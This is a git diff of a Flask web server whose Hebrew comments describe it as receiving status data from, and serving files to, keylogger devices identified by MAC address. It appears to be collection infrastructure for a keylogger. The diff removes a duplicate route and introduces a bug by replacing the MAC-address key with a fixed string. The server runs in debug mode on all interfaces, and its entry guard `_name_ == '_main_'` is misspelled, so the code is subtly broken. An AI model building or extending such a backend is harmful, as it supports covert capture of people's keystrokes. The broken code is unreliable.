@@ -50,30 +50,6 @@ def status_update():
         return jsonify({"error": str(e)}), 500
 
 
-@app.route('/api/status/update', methods=['POST'])
-def status_update():
-    print("/api/status/update")
-    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON"}), 400
-
-        # תיקון שם המפתח ל-mac_address
-        mac_address = data.get("macAddress")  # שים לב למפתח הזה
-        if not mac_address:
-            return jsonify({"error": "Missing macAddress"}), 400
-
-        status = {mac_address: data}
-        write_to_json("device_status", status)
-        print("📥 נתונים שהתקבלו:", data)
-        return jsonify({"message": "Success"}), 200
-    except Exception as e:
-        print("❌ שגיאה:", e)
-        return jsonify({"error": str(e)}), 500
-
-
-
 @app.route('/api/data/files', methods=['GET'])
 def get_data():
     """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
@@ -146,7 +122,7 @@ def change_status():
         if not mac_address:
             return jsonify({"error": "Missing macAddress"}), 400
 
-        status = {mac_address: data}
+        status = {"mac_address": data}
         write_to_json("change_device_status", status)
         print("📥 Received data:", data)
         return jsonify({"message": "Success"}), 200
@@ -159,6 +135,8 @@ def change_status():
         return jsonify({"error": str(e)}), 500
 
 
+
+
 if _name_ == '_main_':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port, debug=True)
